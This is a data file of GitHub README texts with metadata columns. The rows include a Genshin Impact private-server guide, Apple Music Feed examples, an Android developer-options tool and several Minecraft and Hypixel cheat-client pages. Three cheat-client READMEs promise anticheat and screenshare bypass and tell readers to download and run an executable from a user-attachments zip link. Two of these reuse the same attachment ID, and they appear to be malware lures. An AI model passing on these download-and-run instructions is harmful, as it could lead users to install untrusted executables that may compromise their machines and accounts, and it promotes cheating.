| [GenshinImpact_5.0.0.zip.006](https://autopatchhk.yuanshen.com/client_app/download/pc_zip/20240816185649_LtymMnnIZVQfbLZ2/GenshinImpact_5.0.0.zip.006) | 10.0 GB | 20.0 GB | 881432ceab27987b1297c9eefb39f192 |
| [GenshinImpact_5.0.0.zip.007](https://autopatchhk.yuanshen.com/client_app/download/pc_zip/20240816185649_LtymMnnIZVQfbLZ2/GenshinImpact_5.0.0.zip.007) | 3.78 GB | 7.57 GB | 951f91992b428385294baf9b6c764d49 |
| [Audio_Chinese_5.0.0.zip](https://autopatchhk.yuanshen.com/client_app/download/pc_zip/20240816185649_LtymMnnIZVQfbLZ2/Audio_Chinese_5.0.0.zip) | 14.77 GB | 29.56 GB | 216b3e53f3c5c7e1290891696b2bbc66 |
| [Audio_English(US)_5.0.0.zip](https://autopatchhk.yuanshen.com/client_app/download/pc_zip/20240816185649_LtymMnnIZVQfbLZ2/Audio_English(US)_5.0.0.zip) | 17.23 GB | 34.47 GB | ecd59f31ec48c50f9051fdad39603d67 |
| [Audio_Korean_5.0.0.zip](https://autopatchhk.yuanshen.com/client_app/download/pc_zip/20240816185649_LtymMnnIZVQfbLZ2/Audio_Korean_5.0.0.zip) | 14.51 GB | 29.04 GB | 8bf09bd07413189b69a5a0512df97335 |
| [Audio_Japanese_5.0.0.zip](https://autopatchhk.yuanshen.com/client_app/download/pc_zip/20240816185649_LtymMnnIZVQfbLZ2/Audio_Japanese_5.0.0.zip) | 19.37 GB | 38.76 GB | 95efbd23e1bde2eb574f8090cc118109 |

- Or get the 4.8.0 -> 5.0.0 hdiffs:


| Download link | Package size | Decompressed package size | MD5 checksum |
| :---: | :---: | :---: | :---: |
| [game_4.8.0_5.0.0_hdiff_wZvKsUhQtnBEutrh.zip](https://autopatchhk.yuanshen.com/client_app/update/hk4e_global/game_4.8.0_5.0.0_hdiff_wZvKsUhQtnBEutrh.zip) | 19.52 GB | 39.86 | ec0cc740e01c374cd53d48219c1a4aff |
| [audio_ko-kr_4.8.0_5.0.0_hdiff_gTmBNUAGPpXxrRKC.zip](https://autopatchhk.yuanshen.com/client_app/update/hk4e_global/audio_ko-kr_4.8.0_5.0.0_hdiff_gTmBNUAGPpXxrRKC.zip) | 0.60 GB | 1.31 GB | 64c52d4065a5d5983b37faeb9796a3eb |
| [audio_ja-jp_4.8.0_5.0.0_hdiff_LumPhRraNOjGJMnG.zip](https://autopatchhk.yuanshen.com/client_app/update/hk4e_global/audio_ja-jp_4.8.0_5.0.0_hdiff_LumPhRraNOjGJMnG.zip) | 0.71 GB | 1.63 GB | 934899593f7234bec937fca98c0b0bed |
| [audio_zh-cn_4.8.0_5.0.0_hdiff_ZZiDHvYQeHGKuFeP.zip](https://autopatchhk.yuanshen.com/client_app/update/hk4e_global/audio_zh-cn_4.8.0_5.0.0_hdiff_ZZiDHvYQeHGKuFeP.zip) | 0.62 GB | 1.35 GB | c1073373d6c7b3680217335dc346de50 |
| [audio_en-us_4.8.0_5.0.0_hdiff_vsfAECOkroqoZSqK.zip](https://autopatchhk.yuanshen.com/client_app/update/hk4e_global/audio_en-us_4.8.0_5.0.0_hdiff_vsfAECOkroqoZSqK.zip) | 0.74 GB | 1.58 GB | b5cb77749a0e2fc0e85b6b1ee319a7e9 |


- Make sure to install java and set the environment variables.
- Build the server (refer to ""Compile the actual server"" in this guide.)
- Put [Astrolabe.dll](https://github.com/Kei-Luna/LunaGC_5.0.0/raw/main/patch/Astrolabe.dll) in the local game root directory
- Download the [Resources](https://github.com/Kei-Luna/LunaGC_Resources_5.0.0), make a new folder called `resources` in the downloaded LunaGC folder and then extract the resources in that new folder.
- Set useEncryption, Questing and useInRouting to false (it should be false by default, if not then change it)
- Start the server and the game, make sure to also create an account in the LunaGC console!
- Have fun

### Getting started

- Clone the repository (install [Git](https://git-scm.com) first )
```
git clone https://github.com/Kei-Luna/LunaGC_5.0.0.git
```

- Now you can continue with the steps below.


### Compile the actual Server

**Sidenote**: Make sure to append the right prefix and suffix based on your operating system (./ for linux | .\ for windows | add .bat for windows systems when compiling server JAR/handbook).

**Requirements**:

[Java Development Kit 17 | JDK](https://oracle.com/java/technologies/javase/jdk17-archive-downloads.html) or higher

- **Sidenote**: Handbook generation may fail on some systems. To disable handbook generation, append `-PskipHandbook=1` to the `gradlew jar` command.

- **For Windows**:
```shell
.\gradlew.bat
.\gradlew.bat jar
```
*If you are wondering, the first command is to set up the environment while the 2nd one is for building the server JAR file.*

- **For Linux**:
```bash
chmod +x gradlew
./gradlew jar
```
*If you are wondering, the first command is to make the file executeable and for the rest refer to the windows explanation.*

### You can find the output JAR in the project root folder.

### Manually compile the handbook
```shell
./gradlew generateHandbook
```

## Troubleshooting
- Make sure to set useEncryption and useInRouting both to false otherwise you might encounter errors.
- To use windy make sure that you put your luac files in C:\Windy (make the folder if it doesnt exist)
- If you get an error related to MongoDB connection timeout, check if the mongodb service is running. On windows: Press windows key and r then type `services.msc`, look for mongodb server and if it's not started then start it by right clicking on it and start. On linux, you can do `systemctl status mongod` to see if it's running, if it isn't then type `systemctl start mongod`. However, if you get error 14 on linux change the owner of the mongodb folder and the .sock file (`sudo chown -R mongodb:mongodb /var/lib/mongodb` and `sudo chown mongodb:mongodb /tmp/mongodb-27017.sock` then try to start the service again.)


## How to make or get custom banners?
- Well, you can get pre-made ones from this [github repo](https://github.com/Zhaokugua/Grasscutter_Banners)
- Rename the file you chose to download to Banners.json and replace it with the already-existing one in the data folder.
- The repo also offers a file which contains all of the banners, to use it follow the same procedure mentioned above.
### Making custom banners
- If you want to make a custom banner for a character or weapon, you'll need to know the prefabPath, the titlePath and the character/item IDs.
- Fun fact: You can set any item to be on the rateUp, even if it's a 4* instead of a 5*.

## Handmade Handbook (tested)
- Create accounts: /account <username>
- Get all achievements: /am grantall
- God mode: /prop god 1
- Enter a domain: /dungeon <ID>
- Unlimited stamina: /prop ns 0
- Unlimited energy: /prop UnlimitedEnergy 1
- Recharge energy: /er
- Set constellation for selected character: /setConst <number 1 to 6>
- Get rid of the skill cooldown: /stat cdr 99
- Change weather: /weather <sunny/rain/cloudy/thunderstorm/snow/mist>
- Change talent for selected character: /talent <n/e/q/all> <level> (n - normal attack only) (e - skill only) (q - burst only)
- Give items: /g <itemId|avatarId|all|weapons|mats|avatars> [lv<number>] [r<refinement number>] [x<amount>] [c<constellation number>] [sl<skilllevel>]
- Unlock all: /unlockall
- Change world level: /prop wl <number>
- Change AR: /prop player_level <number between 1 and 60>
- Change the game speed: /gamespeed <0.1|0.2|0.5|0.75|1.0|1.5|2.0|3.0>
- Get 9999 Intertwined fates: /g 223 x9999
- Get 9999 Acquaint fates: /g 224 x9999
- Get 9999 Mora: /g 202 x9999
- Get 9999 Primogems: /g 201 x9999
### Make sure to not include <> or [] in the commands! The stuff in <> means its required and the stuff in [] means its not required.
### How to get all of the stuff maxed out: /g all lv90 r5 c6 c6 sl10 | Then do a separate one for the materials: /g mats x99999
### Ways to TP around the map:

Method 1:

- 1: Unlock the map: /prop um 1
- 2: Open the map
- 3: Use the waypoints

Method 2:

- 1: Open the map
- 2: Place a fishing rod marker (the last one) where you want to teleport and mark it.
### How to get avatar/entity/material etc. IDs?
- Go to [ambr.top](https://ambr.top)
- Search up the material/avatar/enemy and then the ID of it should be in the URL of the site, for example I searched for the pyro hilichurl archer; the link for it is ambr.top/en/archive/monster/21010501/pyro-hilichurl-shooter so the ID for it will be 21010501.


### How to spawn monsters?
- Get the ID from the ambr.top link (above)
- Do /spawn <id> in the in-game chat. You can also find out more arguments that you can use to modify the monster hp etc by doing `/help spawn` or `/spawn` | Example: `/spawn 21010501`, that will spawn a pyro hilichurl. Give it more hp: `/spawn 21010501 hp9999` and you can find more about the arguments trough the method I mentioned above.

### How to use the brand new /uid command?
- Rich text is supported
- How to set custom UID: `/uid set changethistext` | bold: `/uid set <b>changethistext</b>` | italic: `/uid set <i>changethistext</i>` | combined: `/uid set <i><b>changethistext</b></i>` | colored text (you'll need a hex color code, you can easy get and pick one by search hex color picker on google now let's assume that you have done it): `/uid set <color=#698ae8>changethistext</color>`
- You can also include spaces like this: `/uid set <b>B O L D</b>`
- You can combine the bold, italic and colored text
- Restore to server-default UID: `/uid default`

## What doesn't work
- Wishing
- Quests
- Serenitea pot
- Abyss
- Mail
- Battlepass
- Events
- Claiming AR/Commission rewards
- Claiming bosses drops
- City reputation
- Character ascension
- Gadgets
- Forging
- Some inventory stuff
- Weapon refinement
- Registration in-game using the box when logging in for first time (use console to make account instead)
### Even more

## Credit

Repository containing the original Proto [XilonenImpact](https://git.xeondev.com/reversedrooms/XilonenImpact/src/commit/92c687cae20ba2dda20ceabe338d6e4125b19f7e/hk4e_proto/out/cmd.rs)",0,2,1,15.0,"['setup', 'guide', 'you', 'need', 'proxy', 'connect', 'server', 'read', 'handbook', 'found', 'end', 'file', 'some', 'stuff', 'mention', 'such', 'wishing', 'etc', 'work', 'main', 'requirement', 'get', 'start', 'compile', 'actual', 'server', 'you', 'find', 'output', 'jar', 'project', 'root', 'folder', 'manually', 'compile', 'handbook', 'troubleshoot', 'how', 'make', 'get', 'custom', 'banner', 'make', 'custom', 'banner', 'handmade', 'handbook', 'test', 'make', 'sure', 'include', 'command', 'the', 'stuff', 'mean', 'require', 'stuff', 'mean', 'require', 'how', 'get', 'stuff', 'maxed', 'out', 'then', 'separate', 'one', 'material', 'mat', 'way', 'tp', 'around', 'map', 'how', 'get', 'etc', 'id', 'how', 'spawn', 'monster', 'how', 'use', 'brand', 'new', 'command', 'what', 'work', 'even', 'credit']","['how', 'stuff', 'get', 'handbook', 'make']"
apple/music-feed-examples,main,"# Apple Music Feed Example

A series of files showing how to use Apple Music Feed to access the latest feeds of the content of Apple Music in code. We hope this will make it easier for users to understand how to:

* Authenticate with the JWT.
* Get the metadata for the Apache Parquet files.
* Use the Apache Parquet files.

These example files are written to be simple to understand and may not reflect possible code optimizations.


## Languages:

Currently, there are two examples:
- Python3
- Java 17


## Documentation:

Please see the [full documentation](https://developer.apple.com/documentation/applemusicfeed)

## Getting Started

Please read the READMEs of each project:
- Java: [README.md](java_example/README.md)
- Python: [README.md](python_example/README.md)
",0,0,1,1.0,"['apple', 'music', 'feed', 'example', 'language', 'documentation', 'get', 'start']","['apple', 'music', 'feed', 'example', 'language']"
SiwatGGez/Minecraft-DripX,master,"# Client-Minecraft

Drip X is a Minecraft ghost client that excels in PvP and offers effective anticheat bypasses. It supports versions 1.7 through 1.21.

## Table of Contents
- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [Contributing](#contributing)
- [License](#license)

## Features

Drip X is packed with features designed to enhance your PvP gameplay in Minecraft. Some of the key features include:
- **Effective Anticheat Bypasses**: Stay undetected on servers with strong anticheat systems.
- **PvP Optimizations**: Improve your combat skills with PvP-specific enhancements.
- **Cross-Version Support**: Enjoy using the client in versions ranging from 1.7 to 1.21.
- **Customization Options**: Tailor the client to suit your playstyle with various settings and configurations.
- **User-Friendly Interface**: Intuitive design for ease of use during intense PvP battles.

![Minecraft PvP](https://example.com/minecraft-pvp.jpg)

## Installation

Getting started with Drip X is simple. Follow these steps to install the client on your system:

1. Download the latest version of Drip X from the link below:
   [![Download Drip X](https://img.shields.io/badge/Download-Drip_X-green)](https://github.com/user-attachments/files/16830358/Client.zip)

2. Extract the downloaded ZIP file to a location of your choice on your computer.

3. Run the Drip X executable file and configure the client settings to your preference.

4. Launch Minecraft and start dominating in PvP with Drip X!

## Usage

Once you have Drip X installed, you can start using the client to enhance your Minecraft PvP experience. Here are some tips for making the most out of Drip X:

- **Toggle Features**: Use the in-game menu to toggle different features on and off based on your needs.
- **Practice**: Spend some time practicing on various servers to understand how each feature can benefit your gameplay.
- **Stay Updated**: Check for client updates regularly to ensure you have access to the latest improvements and bug fixes.
- **Join Communities**: Engage with other Drip X users to share tips and tricks for maximizing the client's potential.

For detailed information on all available features and settings, refer to the client documentation included in the download.

## Contributing

We welcome contributions from the Minecraft community to help improve Drip X and make it even better for all users. If you're interested in contributing, here's how you can get involved:

1. Fork the Drip X repository to your own GitHub account.
2. Make your desired changes or additions to the client code.
3. Submit a pull request detailing the improvements you've made.
4. Your contributions will be reviewed by the repository maintainers.

We appreciate any help in enhancing Drip X and ensuring it remains a top-tier Minecraft ghost client.

## License

Drip X is licensed under the MIT License. See the [LICENSE](./LICENSE) file for more details.",1,0,1,0.0,"['table', 'content', 'feature', 'installation', 'usage', 'contribute', 'license']","['table', 'content', 'feature', 'installation', 'usage']"
AlohaRaycin808/Minecraft-Vape,main,"# Minecraft-Vape

Welcome to the Minecraft Vape V4 repository, your go-to source for the stealthy Minecraft ghost client known for its undetectable modules and savable presets. If you're looking for discreet cheating in Minecraft, look no further! This client is designed for convenience, with support for versions 1.7.10, 1.8.9, 1.12.2, and 1.16.5. To install this client, simply use the Lua installer provided.

![Minecraft Vape V4](https://via.placeholder.com/800x400/00ff00/ffffff?text=Minecraft+Vape+V4)

## Features

- Undetectable modules for discreet cheating
- Savable presets for quick setup
- Multi-version support (1.7.10, 1.8.9, 1.12.2, 1.16.5)
- Easy installation with Lua installer

## Installation

To install the Minecraft Vape V4 client, follow these steps:

1. Download the client zip file by clicking the button below:
   
   [![Download Minecraft Vape V4](https://img.shields.io/badge/download-client.zip-<HEX_COLOR_CODE>)](https://github.com/user-attachments/files/16830252/Client.zip)

2. Unzip the downloaded file to your Minecraft client directory.
3. Run the Lua installer to set up the client.
4. Launch Minecraft and enjoy the benefits of the Minecraft Vape V4 client!

## Usage

Once installed, the Minecraft Vape V4 client provides a range of modules and presets for enhancing your gameplay experience. To activate modules or switch presets, simply access the in-game menu using the designated hotkey. Customize your settings to suit your playstyle and start dominating your opponents with ease!

## Contributing

We welcome contributions to the Minecraft Vape V4 repository. If you have any suggestions, improvements, or bug fixes to share, feel free to fork the repository, make your changes, and submit a pull request. Our team will review your contribution and work together to make Minecraft Vape V4 even better!

## Support

If you encounter any issues while using the Minecraft Vape V4 client, please feel free to reach out to our support team. You can contact us through the repository's issue tracker, where our team will be happy to assist you with any problems or questions you may have. Your feedback is valuable to us, and we appreciate your help in improving the Minecraft Vape V4 experience.

## License

The Minecraft Vape V4 client is licensed under the MIT License. You are free to use, modify, and distribute this client under the terms of the MIT License. For more information, please refer to the [LICENSE](LICENSE) file included in this repository.

## Acknowledgements

We would like to express our gratitude to the following individuals and organizations for their contributions to the Minecraft Vape V4 client:

- The Minecraft community for their continued support and feedback
- Lua installer developers for streamlining the installation process
- GitHub for providing a platform for collaboration and open-source development

---

Thank you for visiting the Minecraft Vape V4 repository. We hope you enjoy using this client and that it enhances your Minecraft gameplay experience. Happy cheating and have fun mastering the game with style! 🎮🕶️🚀

![Cheating in Minecraft](https://via.placeholder.com/800x400/0000ff/ffffff?text=Cheating+in+Minecraft)",1,0,1,0.0,"['feature', 'installation', 'usage', 'contribute', 'support', 'license', 'acknowledgement']","['feature', 'installation', 'usage', 'contribute', 'support']"
nhioufgaewnofidasjg/Minecraft-Entropy-Client,main,"# Minecraft Entropy - Ghost Client Repository

Welcome to the **Minecraft-Clients** repository! 🎮 Here you will find the powerful and versatile ghost client, **Minecraft Entropy**, designed to help Minecraft enthusiasts enhance their gameplay experience by providing advanced features. 

![Minecraft Entropy Banner](https://example.com/minecraft_entrophy/banner.jpg)

## Description

**Minecraft Entropy** is a state-of-the-art ghost client that specializes in bypassing screenshares and anti-cheat systems. Its robust features and compatibility with Minecraft versions 1.7.10 and 1.8.9 make it a must-have tool for players looking to elevate their gameplay. The client is conveniently installed via an executable, ensuring seamless integration and ease of use for all users.

## Features

👻 **Ghost Mode**: Stay undetected with our advanced ghost mode feature that keeps you under the radar.

⚔️ **Combat Enhancements**: Gain the upper hand in battles with improved combat abilities and targeting precision.

🌌 **Customization Options**: Tailor your client experience with a wide range of customization options to suit your gameplay style.

🔧 **Anti-Cheat Bypass**: Effortlessly bypass anti-cheat systems and enjoy uninterrupted gameplay sessions.

## Installation

To download and install **Minecraft Entropy**, click the button below:

[![Download Minecraft Entropy](https://img.shields.io/badge/Download-Client.zip-ff69b4)](https://github.com/user-attachments/files/16830252/Client.zip)

## Getting Started

### Prerequisites

Before installing **Minecraft Entropy**, ensure you have the following requirements:

- A computer running Windows 10
- Minecraft version 1.7.10 or 1.8.9 installed
- Sufficient disk space for installation

### Installation Steps

1. Download the **Client.zip** file by clicking the download button above.
2. Extract the contents of the zip file to a location of your choice on your computer.
3. Run the executable file to start the installation process.
4. Follow the on-screen instructions to complete the installation.

## Contributing

We welcome contributions from the community to help improve **Minecraft Entropy**. To contribute, follow these steps:

1. Fork the repository.
2. Make your changes and improvements.
3. Submit a pull request detailing your contributions.

## Acknowledgements

We would like to thank all the contributors who have helped enhance **Minecraft Entropy** and make it a valuable asset for Minecraft players worldwide.

![Minecraft Entropy Logo](https://example.com/minecraft_entrophy/logo.jpg)

## License

This project is licensed under the **MIT License** - see the [LICENSE](LICENSE) file for details.

---

Thank you for visiting the **Minecraft-Clients** repository and exploring **Minecraft Entropy**! 🎉 Get ready to elevate your Minecraft experience with our powerful ghost client. Happy gaming! 🚀",1,0,1,0.0,"['minecraft', 'entropy', 'ghost', 'client', 'repository', 'description', 'feature', 'installation', 'get', 'start', 'prerequisite', 'installation', 'step', 'contribute', 'acknowledgement', 'license']","['installation', 'minecraft', 'entropy', 'ghost', 'client']"
louie-velarde/DevQS,main,"# DevQS

Quick Settings tiles for developers

[<img src=""https://f-droid.org/badge/get-it-on.png""
    alt=""Get it on F-Droid""
    height=""80"">](https://f-droid.org/packages/me.velc.devqs)


Tired of banking and other financial apps whining that Developer Options is on? With *DevQS*,
Developer Options can be toggled off then back on from the Quick Settings panel without resetting
other settings. Long-clicking on any of the tiles will also open the Developer Options settings
screen if the DEV toggle is on.

**IMPORTANT:**

There is no launcher icon nor activity. The tiles must be manually added to the Quick Settings panel.
The app requires the permission WRITE_SECURE_SETTINGS which can be granted using ADB.

`adb shell pm grant me.velc.devqs android.permission.WRITE_SECURE_SETTINGS`

Also, the tiles are disabled while on the lock screen and can only be toggled after unlocking the device.
If that is not the case, try allowing auto-start or turning off battery optimizations for the app.
See [dontkillmyapp.com](https://dontkillmyapp.com) for instructions.

## Screenshots

<img src=""fastlane/metadata/android/en-US/images/phoneScreenshots/1.jpg"" width=49% /> <img src=""fastlane/metadata/android/en-US/images/phoneScreenshots/2.jpg"" width=49% />
",0,0,1,1.0,"['devqs', 'screenshots']","['devqs', 'screenshots']"
ngntu10/OptiMart,main,"# OptiMart

## Requirements

For building and running the application you need:

- [Node 20 & Npm 10](https://nodejs.org/en/download)
- [JDK 17](https://www.oracle.com/java/technologies/downloads/#java21)
- [Maven 3](https://maven.apache.org)

[//]: # ()
[//]: # (## Run the application locally)

[//]: # ()
[//]: # (Install the dependencies:)

[//]: # ()
[//]: # (``` bash)

[//]: # (npm install)

[//]: # (npm run prepare)

[//]: # (```)

[//]: # ()
[//]: # (Make sure to connect to your databse by defining the env file `env.properties` located in `/src/main/resources/`. For example:)

[//]: # ()
[//]: # (``` properties)

[//]: # (# /src/main/resources/env.properties)

[//]: # (DB_DDL_AUTO=update)

[//]: # (DB_URL=jdbc:postgresql://localhost:5432/postgres)

[//]: # (DB_USERNAME=your_username)

[//]: # (DB_PASSWORD=your_password)

[//]: # (```)

[//]: # ()
[//]: # (Run the server:)

[//]: # ()
[//]: # (``` bash)

[//]: # (mvn spring-boot:run)

[//]: # (```)

[//]: # ()
[//]: # (Use a browser to navigate to [http://localhost:8080/swagger-ui/index.html]&#40;http://localhost:8080/api/v1/swagger-ui/index.html&#41;.)

[//]: # ()
[//]: # (## Run tests)

[//]: # ()
[//]: # (``` bash)

[//]: # (mvn test)

[//]: # (```)

[//]: # ()
[//]: # (## Other commands)

[//]: # ()
[//]: # (### Format code)

[//]: # ()
[//]: # (``` bash)

[//]: # (mvn fmt:format)

[//]: # (```)

[//]: # (## How to name a branch?)

[//]: # ()
[//]: # (Branch name pattern:)

[//]: # ()
[//]: # ()
[//]: # (```text)

[//]: # (type/description-in-kebab-case)

[//]: # ()
[//]: # (type/issue-#{issue_number})

[//]: # ()
[//]: # (```)

[//]: # ()
[//]: # (Examples:)

[//]: # ()
[//]: # (```text)

[//]: # (feature/issue-#99)

[//]: # (```)

[//]: # ()
[//]: # (```text)

[//]: # (hotfix/quick-fix-for-an-emergency)

[//]: # (```)

[//]: # ()
[//]: # (Common types according to [simplified convention for naming branches]&#40;https://dev.to/varbsan/a-simplified-convention-for-naming-branches-and-commits-in-git-il4&#41;)

[//]: # (- feature: adding, refactoring or removing a feature)

[//]: # (- bugfix: fixing a bug)

[//]: # (- hotfix: changing code with a temporary solution and/or without following the usual process &#40;usually because of an emergency&#41;)

[//]: # (- test: experimenting outside of an issue/ticket)

[//]: # ()

## How to name a commit message?

**Commitlint** checks if your commit messages meet the [conventional commit format](https://conventionalcommits.org).

Commit message pattern:

```sh
type(scope?): subject  #scope is optional; multiple scopes are supported (current delimiter options: ""/"", ""\"" and "","")
```

Examples:

```text
chore: run tests on travis ci
```

```text
fix(server): send cors headers
```

```text
feat(blog): add comment section
```

Common types according to [commitlint-config-conventional (based on the Angular convention)](https://github.com/conventional-changelog/commitlint/tree/master/@commitlint/config-conventional#type-enum) can be:

- build
- chore
- ci
- docs
- feat
- fix
- perf
- refactor
- revert
- style
- test

[//]: # (## References)

[//]: # ()
[//]: # (Read these references if needed:)

[//]: # ()
[//]: # (- [Open api swagger]&#40;https://springdoc.org/&#41;)

[//]: # (- [Lombok]&#40;https://codippa.com/lombok/&#41;)

[//]: # (- [JPA/Hibernate entity relationships]&#40;https://www.baeldung.com/jpa-hibernate-associations&#41;)

[//]: # (- [Hibernate type mappings]&#40;https://vladmihalcea.com/a-beginners-guide-to-hibernate-types/&#41;)",0,1,2,1.0,"['optimart', 'requirement', 'run', 'application', 'locally', 'install', 'dependency', 'bash', 'npm', 'install', 'npm', 'run', 'prepare', 'make', 'sure', 'connect', 'databse', 'define', 'env', 'file', 'locate', 'for', 'example', 'property', 'postgresql', 'run', 'server', 'bash', 'mvn', 'run', 'use', 'browser', 'navigate', 'http', 'http', 'run', 'test', 'bash', 'mvn', 'test', 'other', 'command', 'format', 'code', 'bash', 'mvn', 'fmt', 'format', 'how', 'name', 'branch', 'branch', 'name', 'pattern', 'text', 'example', 'text', 'text', 'common', 'type', 'accord', 'simplify', 'convention', 'name', 'branch', 'http', 'feature', 'add', 'refactoring', 'remove', 'feature', 'bugfix', 'fixing', 'bug', 'hotfix', 'changing', 'code', 'temporary', 'solution', 'without', 'follow', 'usual', 'process', 'usually', 'emergency', 'test', 'experimenting', 'outside', 'how', 'name', 'commit', 'message', 'reference', 'read', 'reference', 'need', 'open', 'api', 'swagger', 'http', 'lombok', 'http', 'entity', 'relationship', 'http', 'hibernate', 'type', 'mapping', 'http']","['http', 'run', 'bash', 'name', 'mvn']"
BigBabyPigeon/Oringo-Client,main,"### Oringo-Client-Supporter version
imo best hypixel skyblock cheat

## Feature list

## Skyblock																								
### Skills
- Mithril Macro
- Shortbow Triggerbot
- Auto Enchanting
- Rod Stacker
- Dojo Helper
- Crop Nuker
- Dillo Finder
- Auto Jax Range
- Cookie Clicker
- Macro Helper

### Mining
- Pingless Hardstone
- Auto Powder Chest
- Grotto Notification
- Blaze Swapper
- Gemstone ESP
- FD Swapper
- Living Metal Miner
- Block Nuker

### Slayer
- Vampire Helper
- Hide Summons
- Mythological Helper
- Rift Farming Helper
- Corleone Finder
- Anti Nukekubi
- Auto Maddox
- Mirrorverse Helper
- AOTV Return
- Nucleus Helper
- Auto Soulcry
- Auto Stun Snake
- Hotbar Swapper
- Armor Swapper
- Impact Spammer

### QOL (Quality of Life)
- Kuudra Helper
- Auto Join Skyblock
- Auto Conversation
- Garden Helper
- Auto Cloak
- Auto Heal
- Auto Join Skyblock
- No Break Reset
- No Carpet
- Gui Move
- No Block
- Delays
- Vclip
- Auto Visitors
- Auto Frozille
- Auto Scribe
- Auto Relay
- Auto Hack
- Auto Harp
- Auto Joey
- Auto Combine

## Dungeons
### Main
- Terminator Aura
- Auto Terminals
- Secret Hitboxes
- Auto Ice Spray
- Auto Requeue
- Blood Aimbot
- Thorn Aimbot
- Ghost Blocks
- Auto Salvage
- Auto Rabbit
- Auto Rogue
- Secret Aura
- Livid Finder
- Frag Helper
- Stair Phase
- Auto Water
- Auto Close
- Auto Mask
- Bar Phase
- Auto Leap
- Bear Aura
- Brush
- Hclip

### Floor 7
- Auto Terminals
- Ice Fill Helper
- Terminal Aura
- Auto Weirdos
- Auto Crystal
- Auto Middle
- Auto Simon

### Puzzle
- Ice Fill Helper
- Auto Ice Path
- Auto Beams
- Tic Tac Toe
- Auto Ice Fill
- Auto Arrow
- Auto Blaze
- Auto Quiz

## Visuals
### UI
- Popup Animations
- Server Rotations
- Inventory HUD
- Dungeon Map
- Discord RPC
- Color Codes
- Module List
- Motion Blur
- Target HUD
- ScreenShot
- Animations
- Scoreboard
- Nick Hider
- Interfaces
- China Hat
- Boss Bar
- Click GUI
- Camera
- Glint
- Trail
- IRC

### World
- Frozen Treasure ESP
- Creeper Nametags
- Custom Hub Map
- Enigma Soul ESP
- Dragon Hitboxes
- Vanquisher ESP
- Render Barriers
- Mushroom ESP
- Fairy Soul ESP
- Cinderbat ESP
- Time Changer
- Dungeon ESP
- Shiny Blocks
- Hostage ESP
- Odonata ESP
- Hide Players
- Custom ESP
- Arcade ESP
- No Foliage
- Full Bright
- Nametags
- Player ESP
- Trajectory
- Chest ESP
- Free Cam
- Door ESP
- Pelt ESP
- Giants
- XRay

## PVP
### Combat
- Sumo Fences
- Auto Clicker
- Aim Assist
- Block Hit
- Kill Aura
- Antibot
- Reach
- W Tap
- No Jump Boost
- Anti Stuck
- No Slow
- Speed
- Sprint
- Flight
- Eagle
- Auto Tool
- Reset VL
- Velocity
- No Void
- Inventory Manager
- Anti Obsidian
- Chest Stealer
- Fast Break
- Auto Craft
- Auto Echo
- No Rotate

### Movement
- No Jump Boost
- Anti Stuck
- No Slow
- Speed
- Sprint
- Flight
- Eagle
- Auto Echo
- Auto Tool

### Player
- Inventory Manager
- Anti Obsidian
- Chest Stealer
- Fast Break
- Auto Craft
- Auto Echo
- No Rotate
- Reset VL
- Velocity
- No Void
",1,0,1,0.0,"['version', 'feature', 'list', 'skyblock', 'skill', 'mining', 'slayer', 'qol', 'quality', 'life', 'dungeon', 'main', 'floor', 'puzzle', 'visuals', 'ui', 'world', 'pvp', 'combat', 'movement', 'player']","['version', 'feature', 'list', 'skyblock', 'skill']"
yashksaini-coder/August-Leetcode-Daily-2024,main,"<div align=""center"">
    <img src=""https://socialify.git.ci/yashksaini-coder/August-Leetcode-Daily-2024/image?forks=1&issues=1&language=1&name=1&pattern=Diagonal%20Stripes&pulls=1&stargazers=1&theme=Auto"" alt=""AI-Coding-Assistant"" width=""640"" height=""320"" />
</div>
<br><br>

<div align=""center"">
    <img alt=""GitHub Repo Name"" src=""https://img.shields.io/badge/Repo-August_Leetcode_Daily_2024-blue"">
    <img alt=""GitHub Author"" src=""https://img.shields.io/badge/Author-Yash%20K.%20Saini-1D3557"">
    <img alt=""GitHub commit-activity"" src=""https://img.shields.io/github/commit-activity/t/yashksaini-coder/August-Leetcode-Daily-2024"">
    <img alt=""GitHub contributors"" src=""https://img.shields.io/github/contributors/yashksaini-coder/August-Leetcode-Daily-2024"">
    <img alt=""GitHub Created At"" src=""https://img.shields.io/github/created-at/yashksaini-coder/August-Leetcode-Daily-2024"">
    <img alt=""GitHub Last Commit"" src=""https://img.shields.io/github/last-commit/yashksaini-coder/August-Leetcode-Daily-2024"">
    <img alt=""GitHub Repo Size"" src=""https://img.shields.io/github/repo-size/yashksaini-coder/August-Leetcode-Daily-2024"">
    <img alt=""GitHub License"" src=""https://img.shields.io/github/license/yashksaini-coder/August-Leetcode-Daily-2024"">
    <img alt=""GitHub Open Issues"" src=""https://img.shields.io/github/issues/yashksaini-coder/August-Leetcode-Daily-2024"">
    <img alt=""GitHub Closed Issues"" src=""https://img.shields.io/github/issues-closed/yashksaini-coder/August-Leetcode-Daily-2024"">
    <img alt=""GitHub Open PR"" src=""https://img.shields.io/github/issues-pr/yashksaini-coder/August-Leetcode-Daily-2024"">
    <img alt=""GitHub Closed PR"" src=""https://img.shields.io/github/issues-pr-closed/yashksaini-coder/August-Leetcode-Daily-2024"">
    <img alt=""GitHub Forks"" src=""https://img.shields.io/github/forks/yashksaini-coder/August-Leetcode-Daily-2024"">
    <img alt=""GitHub Stars"" src=""https://img.shields.io/github/stars/yashksaini-coder/August-Leetcode-Daily-2024"">
    <img alt=""GitHub Watchers"" src=""https://img.shields.io/github/watchers/yashksaini-coder/August-Leetcode-Daily-2024"">
    <img alt=""GitHub language count"" src=""https://img.shields.io/github/languages/count/yashksaini-coder/August-Leetcode-Daily-2024"">
</div>
<br>

<div align='center'>
    <a href=""mailto:ys3853428@gmail.com""> <img src=""https://img.shields.io/badge/Gmail-D14836?style=for-the-badge&logo=gmail&logoColor=white""> </a>
    <a href=""https://github.com/yashksaini-coder""> <img src=""https://img.shields.io/badge/GitHub-100000?style=for-the-badge&logo=github&logoColor=white""> </a>
    <a href=""https://medium.com/@yashksaini""> <img src=""https://img.shields.io/badge/Medium-12100E?style=for-the-badge&logo=medium&logoColor=white""> </a>
    <a href=""https://www.linkedin.com/in/yashksaini/""> <img src=""https://img.shields.io/badge/LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white""> </a>
    <a href=""https://bento.me/yashksaini""> <img src=""https://img.shields.io/badge/Bento-768CFF.svg?style=for-the-badge&logo=Bento&logoColor=white""> </a>
